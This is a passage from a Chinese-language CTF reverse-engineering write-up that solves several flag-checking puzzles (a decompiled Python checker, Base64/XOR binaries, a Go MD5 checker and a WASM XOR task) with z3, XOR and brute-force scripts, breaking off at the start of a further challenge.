class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># uncompyle6 version 3.5.0</span><br><span class="hljs-comment"># Python bytecode 3.7 (3394)</span><br><span class="hljs-comment"># Decompiled from: Python 2.7.5 (default, Nov 16 2020, 22:23:17) </span><br><span class="hljs-comment"># [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]</span><br><span class="hljs-comment"># Embedded file name: easypy.py</span><br><span class="hljs-comment"># Size of source mod 2**32: 1805 bytes</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Challenge</span>():</span><br>    <span class="hljs-keyword">import</span> sys<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Welcome to py&#x27;s world&quot;</span>)<br>    S = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;plz give me your flag:&#x27;</span>)<br>    Key = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;plz give me your key(string):&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(S) != <span class="hljs-number">51</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">len</span>(Key) != <span class="hljs-number">8</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;the flag&#x27;s or key&#x27;s strlen...&quot;</span>)<br>        sys.exit()<br>    <span class="hljs-keyword">else</span>:<br>        tmp = S[<span class="hljs-number">4</span>:<span class="hljs-number">50</span>]<br>        KEY_cmp = <span class="hljs-string">&#x27;Syclover&#x27;</span><br>        key = []<br>        key_cmp = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Key:<br>            key.append(<span class="hljs-built_in">ord</span>(i))<br><br>        <span class="hljs-keyword">try</span>:<br>            key_cmp += <span class="hljs-built_in">chr</span>((key[<span class="hljs-number">1</span>] * key[<span class="hljs-number">2</span>] - key[<span class="hljs-number">5</span>] * <span class="hljs-number">72</span> - key[<span class="hljs-number">4</span>] * <span class="hljs-number">3</span> - key[<span class="hljs-number">3</span>] ^ key[<span class="hljs-number">1</span>] + (key[<span class="hljs-number">3</span>] &lt;&lt; <span class="hljs-number">2</span>) + key[<span class="hljs-number">2</span>] * <span class="hljs-number">6</span> - key[<span class="hljs-number">7</span>] &amp; key[<span class="hljs-number">6</span>] - <span class="hljs-number">1000</span>) - <span class="hljs-number">14</span>)<br>            key_cmp += <span class="hljs-built_in">chr</span>((key[<span class="hljs-number">5</span>] * <span class="hljs-number">7</span> + key[<span class="hljs-number">3</span>] * <span class="hljs-number">3</span> + key[<span class="hljs-number">2</span>] + key[<span class="hljs-number">6</span>] - (key[<span class="hljs-number">2</span>] &gt;&gt; <span class="hljs-number">2</span>) - key[<span class="hljs-number">1</span>] ^ key[<span class="hljs-number">0</span>] + key[<span class="hljs-number">7</span>] + (key[<span class="hljs-number">4</span>] ^ key[<span class="hljs-number">1</span>]) + (key[<span class="hljs-number">4</span>] | key[<span class="hljs-number">7</span>])) - <span class="hljs-number">801</span>)<br>            key_cmp += <span class="hljs-built_in">chr</span>((key[<span class="hljs-number">6</span>] * <span class="hljs-number">5</span> + key[<span class="hljs-number">2</span>] * <span class="hljs-number">6</span> - key[<span class="hljs-number">3</span>] * <span class="hljs-number">7</span> + key[<span class="hljs-number">4</span>] | key[<span class="hljs-number">5</span>] + key[<span class="hljs-number">4</span>] * <span class="hljs-number">10</span> + key[<span class="hljs-number">0</span>] ^ key[<span class="hljs-number">1</span>] * <span class="hljs-number">3</span> - key[<span class="hljs-number">7</span>] + key[<span class="hljs-number">0</span>] + key[<span class="hljs-number">1</span>]) - <span class="hljs-number">924</span>)<br>            key_cmp += <span class="hljs-built_in">chr</span>(key[<span class="hljs-number">1</span>] * <span class="hljs-number">3</span> + key[<span class="hljs-number">5</span>] * <span class="hljs-number">9</span> + key[<span class="hljs-number">0</span>] + key[<span class="hljs-number">2</span>] * <span class="hljs-number">2</span> + key[<span class="hljs-number">3</span>] * <span class="hljs-number">5</span> - key[<span class="hljs-number">4</span>] * (key[<span class="hljs-number">6</span>] ^ key[<span class="hljs-number">7</span>]) + <span class="hljs-number">321</span> - <span class="hljs-number">16</span>)<br>            key_cmp += <span class="hljs-built_in">chr</span>((key[<span class="hljs-number">5</span>] * <span class="hljs-number">12</span> - key[<span class="hljs-number">0</span>] ^ key[<span class="hljs-number">6</span>] - key[<span class="hljs-number">3</span>] * <span class="hljs-number">23</span> + key[<span class="hljs-number">4</span>] * <span class="hljs-number">3</span> + key[<span class="hljs-number">2</span>] * <span class="hljs-number">8</span> + key[<span class="hljs-number">1</span>] - key[<span class="hljs-number">7</span>] * <span class="hljs-number">2</span> + key[<span class="hljs-number">6</span>] * <span class="hljs-number">4</span> + <span class="hljs-number">1324</span>) + <span class="hljs-number">1</span>)<br>            key_cmp += <span class="hljs-built_in">chr</span>(key[<span class="hljs-number">3</span>] * <span class="hljs-number">54</span> - key[<span class="hljs-number">1</span>] * <span class="hljs-number">3</span> + key[<span class="hljs-number">2</span>] * <span class="hljs-number">3</span> + key[<span class="hljs-number">4</span>] * <span class="hljs-number">11</span> - key[<span class="hljs-number">5</span>] * <span class="hljs-number">2</span> + key[<span class="hljs-number">0</span>] + key[<span class="hljs-number">7</span>] * <span class="hljs-number">3</span> - key[<span class="hljs-number">6</span>] - <span class="hljs-number">6298</span> + <span class="hljs-number">40</span>)<br>            key_cmp += <span class="hljs-built_in">chr</span>(key[<span class="hljs-number">7</span>] - key[<span class="hljs-number">6</span>] * key[<span class="hljs-number">3</span>] + key[<span class="hljs-number">2</span>] * key[<span class="hljs-number">2</span>] - key[<span class="hljs-number">4</span>] * <span class="hljs-number">32</span> + key[<span class="hljs-number">5</span>] * (key[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">2</span>) - key[<span class="hljs-number">1</span>] * key[<span class="hljs-number">1</span>] - <span class="hljs-number">6689</span> + <span class="hljs-number">41</span>)<br>            key_cmp += <span class="hljs-built_in">chr</span>((key[<span class="hljs-number">5</span>] - key[<span class="hljs-number">3</span>] * <span class="hljs-number">41</span> + key[<span class="hljs-number">6</span>] * <span class="hljs-number">41</span> + key[<span class="hljs-number">5</span>] ^ (key[<span class="hljs-number">4</span>] &amp; key[<span class="hljs-number">6</span>] | key[<span class="hljs-number">0</span>]) - (key[<span class="hljs-number">7</span>] * <span class="hljs-number">24</span> | key[<span class="hljs-number">2</span>]) + key[<span class="hljs-number">1</span>] - <span class="hljs-number">589</span>) - <span class="hljs-number">36</span>)<br>        <span class="hljs-keyword">except</span> ValueError:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;You know what I&#x27;m going to say...&quot;</span>)<br>            sys.exit()<br><br>        <span class="hljs-keyword">if</span> key_cmp != KEY_cmp:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;You know what I&#x27;m going to say...&quot;</span>)<br>            sys.exit()<br>        flag = [<br>         <span class="hljs-number">113</span>, <span class="hljs-number">74</span>, <span class="hljs-number">71</span>, <span class="hljs-number">35</span>, <span class="hljs-number">29</span>, <span class="hljs-number">91</span>, <span class="hljs-number">29</span>, <span class="hljs-number">12</span>, <span class="hljs-number">114</span>, <span class="hljs-number">73</span>, <span class="hljs-number">60</span>, <span class="hljs-number">52</span>, <span class="hljs-number">69</span>, <span class="hljs-number">5</span>, <span class="hljs-number">113</span>, <span class="hljs-number">35</span>, <span class="hljs-number">95</span>, <span class="hljs-number">38</span>, <span class="hljs-number">20</span>, <span class="hljs-number">112</span>, <span class="hljs-number">95</span>, <span class="hljs-number">7</span>, <span class="hljs-number">74</span>, <span class="hljs-number">12</span>, <span class="hljs-number">102</span>, <span class="hljs-number">23</span>, <span class="hljs-number">7</span>, <span class="hljs-number">31</span>, <span class="hljs-number">87</span>, <span class="hljs-number">5</span>, <span class="hljs-number">113</span>, <span class="hljs-number">98</span>, <span class="hljs-number">85</span>, <span class="hljs-number">38</span>, <span class="hljs-number">16</span>, <span class="hljs-number">112</span>, <span class="hljs-number">29</span>, <span class="hljs-number">6</span>, <span class="hljs-number">30</span>, <span class="hljs-number">12</span>, <span class="hljs-number">65</span>, <span class="hljs-number">73</span>, <span class="hljs-number">83</span>, <span class="hljs-number">36</span>, <span class="hljs-number">12</span>, <span class="hljs-number">23</span>]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">46</span>):<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(tmp[i]) ^ key[((i + <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(key))] != flag[i]:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;You know what I&#x27;m going to say...&quot;</span>)<br>                sys.exit()<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Yeah!Submit your flag in a hurry~&#x27;</span>)<br><br><br>Challenge()<br><br></code></pre></td></tr></table></figure><p>经过简单的分析我们看到  key（长度为 8 ）是这个题目的解题关键，我们看到 try 函数里都是对 key 的每一位进行运算后的数据进行拼接，最后的数据与 “Syclover” 进行比较，如果相同则继续执行。在最后一个的 <code>for i in range(46):</code>便是对输入的 S 与 key 一起异或得到的 flag 的每一位脚本如下：</p><p>解 key 我们采用 z3-solver 来进行求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br><br><br>key1 = BitVec(<span class="hljs-string">&#x27;key1&#x27;</span>,<span class="hljs-number">32</span>)<br>key2 = BitVec(<span class="hljs-string">&#x27;key2&#x27;</span>,<span class="hljs-number">32</span>)<br>key3 = BitVec(<span class="hljs-string">&#x27;key3&#x27;</span>,<span class="hljs-number">32</span>)<br>key4 = BitVec(<span class="hljs-string">&#x27;key4&#x27;</span>,<span class="hljs-number">32</span>)<br>key5 = BitVec(<span class="hljs-string">&#x27;key5&#x27;</span>,<span class="hljs-number">32</span>)<br>key6 = BitVec(<span class="hljs-string">&#x27;key6&#x27;</span>,<span class="hljs-number">32</span>)<br>key7 = BitVec(<span class="hljs-string">&#x27;key7&#x27;</span>,<span class="hljs-number">32</span>)<br>key8 = BitVec(<span class="hljs-string">&#x27;key8&#x27;</span>,<span class="hljs-number">32</span>)<br><br><br><br>key = Solver()<br><br>key.add((key2 * key3 - key6 * <span class="hljs-number">72</span> - key5 * <span class="hljs-number">3</span> - key4 ^ key2 + (key4 &lt;&lt; <span class="hljs-number">2</span>) + key3 * <span class="hljs-number">6</span> - key8 &amp; key7 - <span class="hljs-number">1000</span>) - <span class="hljs-number">14</span>==<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;S&#x27;</span>))<br><br><br>key.add(((key6 * <span class="hljs-number">7</span> + key4 * <span class="hljs-number">3</span> + key3 + key7 - (key3 &gt;&gt; <span class="hljs-number">2</span>) - key2 ^ key1 + key8 + (key5 ^ key2) + (key5 | key8)) - <span class="hljs-number">801</span>)==<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;y&#x27;</span>))<br><br>key.add(((key7 * <span class="hljs-number">5</span> + key3 * <span class="hljs-number">6</span> - key4 * <span class="hljs-number">7</span> + key5 | key6 + key5 * <span class="hljs-number">10</span> + key1 ^ key2 * <span class="hljs-number">3</span> - key8 + key1 + key2) - <span class="hljs-number">924</span>)==<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;c&#x27;</span>))<br><br>key.add((key2 * <span class="hljs-number">3</span> + key6 * <span class="hljs-number">9</span> + key1 + key3 * <span class="hljs-number">2</span> + key4 * <span class="hljs-number">5</span> - key5 * (key7 ^ key8) + <span class="hljs-number">321</span> - <span class="hljs-number">16</span>)==<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;l&#x27;</span>))<br><br>key.add(((key6 * <span class="hljs-number">12</span> - key1 ^ key7 - key4 * <span class="hljs-number">23</span> + key5 * <span class="hljs-number">3</span> + key3 * <span class="hljs-number">8</span> + key2 - key8 * <span class="hljs-number">2</span> + key7 * <span class="hljs-number">4</span> + <span class="hljs-number">1324</span>) + <span class="hljs-number">1</span>)==<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;o&#x27;</span>))<br><br>key.add((key4 * <span class="hljs-number">54</span> - key2 * <span class="hljs-number">3</span> + key3 * <span class="hljs-number">3</span> + key5 * <span class="hljs-number">11</span> - key6 * <span class="hljs-number">2</span> + key1 + key8 * <span class="hljs-number">3</span> - key7 - <span class="hljs-number">6298</span> + <span class="hljs-number">40</span>)==<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;v&#x27;</span>))<br><br>key.add((key8 - key7 * key4 + key3 * key3 - key5 * <span class="hljs-number">32</span> + key6 * (key1 &gt;&gt; <span class="hljs-number">2</span>) - key2 * key2 - <span class="hljs-number">6689</span> + <span class="hljs-number">41</span>)==<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;e&#x27;</span>))<br><br>key.add(((key6 - key4 * <span class="hljs-number">41</span> + key7 * <span class="hljs-number">41</span> + key6 ^ (key5 &amp; key7 | key1) - (key8 * <span class="hljs-number">24</span> | key3) + key2 - <span class="hljs-number">589</span>) - <span class="hljs-number">36</span>)==<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;r&#x27;</span>))<br><br><span class="hljs-keyword">if</span> key.check()==sat:<br>    <span class="hljs-built_in">print</span>(key.model())<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;WA&quot;</span>)<br><br><br></code></pre></td></tr></table></figure><p>可以得到 key 的值为 ：</p><p><img src="https://static01.imgkr.com/temp/820b126431c24af99aa5f01e410f010b.png" alt=""></p><p>接下来我们对 flag 进行求解 ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">key = [<span class="hljs-number">83</span>, <span class="hljs-number">38</span>, <span class="hljs-number">121</span>, <span class="hljs-number">99</span>, <span class="hljs-number">64</span>, <span class="hljs-number">45</span>, <span class="hljs-number">54</span>, <span class="hljs-number">46</span>]<br>flag = [<span class="hljs-number">113</span>, <span class="hljs-number">74</span>, <span class="hljs-number">71</span>, <span class="hljs-number">35</span>, <span class="hljs-number">29</span>, <span class="hljs-number">91</span>, <span class="hljs-number">29</span>, <span class="hljs-number">12</span>, <span class="hljs-number">114</span>, <span class="hljs-number">73</span>, <span class="hljs-number">60</span>, <span class="hljs-number">52</span>, <span class="hljs-number">69</span>, <span class="hljs-number">5</span>, <span class="hljs-number">113</span>, <span class="hljs-number">35</span>, <span class="hljs-number">95</span>, <span class="hljs-number">38</span>, <span class="hljs-number">20</span>, <span class="hljs-number">112</span>, <span class="hljs-number">95</span>, <span class="hljs-number">7</span>, <span class="hljs-number">74</span>, <span class="hljs-number">12</span>, <span class="hljs-number">102</span>, <span class="hljs-number">23</span>, <span class="hljs-number">7</span>, <span class="hljs-number">31</span>, <span class="hljs-number">87</span>, <span class="hljs-number">5</span>, <span class="hljs-number">113</span>, <span class="hljs-number">98</span>, <span class="hljs-number">85</span>, <span class="hljs-number">38</span>, <span class="hljs-number">16</span>, <span class="hljs-number">112</span>, <span class="hljs-number">29</span>, <span class="hljs-number">6</span>, <span class="hljs-number">30</span>, <span class="hljs-number">12</span>, <span class="hljs-number">65</span>, <span class="hljs-number">73</span>, <span class="hljs-number">83</span>, <span class="hljs-number">36</span>, <span class="hljs-number">12</span>, <span class="hljs-number">23</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">46</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">127</span>):<br>        <span class="hljs-keyword">if</span>(j^key[(i+<span class="hljs-number">1</span>)%<span class="hljs-number">8</span>]==flag[i]):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(j),end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p>运行上述脚本便可以得到 flag</p><h3 id="RE-1"><strong>RE 1</strong></h3><p>这个题目感觉就十分的简单了，整体上就是一个 Base64 加上了一个异或。</p><p><img src="https://static01.imgkr.com/temp/6d7dfb0374ac4188981c0bda9061d3bb.png" alt=""></p><p>我们利用<code>Lazy IDA </code>提取对应<code>data</code>里的数据 ：</p><p><img src="https://static01.imgkr.com/temp/41464d1b8d6b49e7a246ceaabf4e00e2.png" alt=""></p><p>然后简单的写一个脚本进行解密 ：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">int</span> compare[] = &#123;<span class="hljs-number">0x15</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x2D</span>,<span class="hljs-number">0x06</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x26</span>,<span class="hljs-number">0x19</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x18</span>,<span class="hljs-number">0x0A</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x7D</span><br>                &#125;;<br><span class="hljs-keyword">int</span> num=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">60</span>; i++) &#123;<br>num=compare[i]^<span class="hljs-number">0x40</span>;<br>cout&lt;&lt;hex&lt;&lt;num&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后我们将得到的字符串用 <code>Python</code>带的<code>Base64</code>库直接<code>decode</code>就可以得到 Flag 。</p><h3 id="Win-32"><strong>Win 32</strong></h3><p>和RE 1 一样直接是一个<code>Base 64</code>的题目，这个题目被修改过，我们可以直接在<code>Strings</code>里提取到<code>Base 64</code>加密后的数据 ：</p><p><img src="https://static01.imgkr.com/temp/c9faf3d05a56447c954c80e4a73b37f3.png" alt=""></p><p>标准 <code>Base64</code> 加密过程 ：</p><p><img src="https://static01.imgkr.com/temp/6530ec5bfcfc452591d69b6523b2d16c.png" alt=""></p><p>于是我们直接拿着那串数据进行<code>Base 64</code>解码就可以得到 Flag。</p><p><img src="https://static01.imgkr.com/temp/c200d6f81ca145f1b51f7c3c9ff67b4a.png" alt=""></p><h3 id="Brute-force"><strong>Brute_force</strong></h3><p>这个题目又是一个新语言（ GO 语言 ）的逆向题目，我们还是将程序拖入<code>IDA</code>中进行分析，其中有一个非常显眼的 <code>main_main</code>，可以看到如下界面 ：</p><p><img src="https://static01.imgkr.com/temp/d6fb1f2a40bb44f1aa5fb8fad4fb5b5c.png" alt=""></p><p>乍一看不知道程序在干些什么，但是我们细看可以发现在函数里面有着<code>MD5</code>的提示，与此同时在<code>main_main</code>上面的 if 语句里面好像有一个 24 ，此时我们猜测这个 24 便是我们输入<code>Flag</code>的长度。但是如果这个时候你开始动调是不是会发现有一个问题，在你启动<code>IDA</code>动态调试后的一瞬间，程序闪了一下就结束了，即使你打了断点也还是闪了一下就结束了，你也可以试试看拿<code>cmd</code>打开，你会发现有一行提示：</p><p><img src="https://static01.imgkr.com/temp/867d984259a14f0385c5981bf2a472ee.png" alt=""></p><p>这个时候我们需要打开<code>IDA</code>里面的<code>Debugger</code></p><p><img src="https://static01.imgkr.com/temp/446f158987a2431da0feebf36fcf2b39.png" alt=""></p><p>在里面找到对应的 <code>Process options</code>，并打开下面的<code>Use source-level debugging</code>（点一下就可以了，点完后没有什么反应的）：</p><p><img src="https://static01.imgkr.com/temp/f33f3525e7af4590bc1e26c90ab8f418.png" alt=""></p><p>我们在 <code>Process options</code>里对应位置填入我们的 24 位测试数据：</p><p><img src="https://static01.imgkr.com/temp/617bfed769834d56ae558cd78cfe192e.png" alt=""></p><p>之后我们在函数<code>main_encode</code>和<code>main_unnamed630</code>里打上断点开始调试，观察里面的数据变化过程，你会发现在栈里多出来一个数据 ：</p><p><img src="https://static01.imgkr.com/temp/e949377cc91a42caab9680617da50a91.png" alt=""></p><p>仔细观察会发现这一串数据在某个位置可以分成两个部分，这两个部分是一样的，我们提出其中一半进行<code>MD5</code>解密你会发现这个加密后的数据是我们输入的<code>ABCD</code>我们大概就可以猜测出这个程序是将我们的输入数据进行拆分，每 4 个一组，一共 24 个数据，那么刚刚好 6 组，也验证了我们猜测 <code>Flag</code>的长度是 24 ，我们继续调试，之后可以发现在内存里是把我们<code>Flag</code>已经提前写入了 ：</p><p><img src="https://static01.imgkr.com/temp/9ff9ea0971a345ab83e69aa8897df686.png" alt=""></p><p>我们需要的就是动态调试得到对应<code>MD5</code>的顺序，然后再对其分别解密，脚本如下 ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>table = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/_&quot;</span><br>list1 = [<span class="hljs-string">&#x27;&#x27;</span>]<span class="hljs-comment">#输入加密的MD5</span><br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> list1:<br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>, <span class="hljs-number">128</span>):<br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>, <span class="hljs-number">128</span>):<br>            <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>, <span class="hljs-number">128</span>):<br>                <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>, <span class="hljs-number">128</span>):<br>                    <span class="hljs-built_in">str</span> = <span class="hljs-built_in">chr</span>(a) + <span class="hljs-built_in">chr</span>(b) + <span class="hljs-built_in">chr</span>(c) + <span class="hljs-built_in">chr</span>(d)<br>                    flag = hashlib.md5(<span class="hljs-built_in">str</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br>                    <span class="hljs-keyword">if</span> flag == j.casefold():<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>可以分别解出来对应的数据为<code>3_sl r0g@ 7h3_ rm_1 g0_p gned</code></p><p>再根据动调出的<code>MD5</code>进行排序，可以得到输入为<code>7h3_g0_pr0g@rm_13_slgned</code>,但是这个就是<code>Flag</code>吗显然不是，我们再观察<code>main_main</code>，切换到汇编层的结构图 ：</p><p><img src="https://static01.imgkr.com/temp/0b37d29a510b4fb098f9fff462a0b45d.png" alt=""></p><p>这个时候我们加上对应格式便是我们所要的<code>Flag</code></p><h3 id="WASM"><strong>WASM</strong></h3><p>整个题目就是找不到工具硬开生坚果~~（WABT就是下载不了）~~，在网上找了半天终于发现有一个易语言写的提取 .o 文件的工具了（太难了）。</p><p>题目整体上就是一个异或（题目提示）我们只需要找到对应位置的是数据进行异或处理就可以了。</p><p><img src="https://static01.imgkr.com/temp/475f6f1ad9e942898bf43ec76ab71619.png" alt=""></p><p><img src="https://static01.imgkr.com/temp/b2227c5b3d1647ce97c9196ff60f54e3.png" alt=""></p><p>解题脚本如下 ：（爆破YYDS）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">int</span> xors;<br><span class="hljs-keyword">char</span> ans[]= &#123;<span class="hljs-number">0x35</span>,<span class="hljs-number">0x3F</span>,<span class="hljs-number">0x25</span>,<span class="hljs-number">0x1D</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x07</span>,<span class="hljs-number">0x15</span>,<span class="hljs-number">0x0B</span>,<span class="hljs-number">0x39</span>,<span class="hljs-number">0x2f</span>,<span class="hljs-number">0x15</span>,<span class="hljs-number">0x39</span>,<span class="hljs-number">0x35</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x39</span>,<span class="hljs-number">0x21</span>,<span class="hljs-number">0x21</span>,<span class="hljs-number">0x09</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0x47</span>,<span class="hljs-number">0x47</span>&#125;;<br><br><span class="hljs-keyword">int</span> m;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">strlen</span>(ans);i++)&#123;<br>m=(<span class="hljs-keyword">int</span>)ans[i]^<span class="hljs-number">0x66</span>;<br>cout&lt;&lt;(<span class="hljs-keyword">char</span>)m;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="猜拳"><strong>猜拳</strong></h3><p>这个题目又是一个<code>Win 32 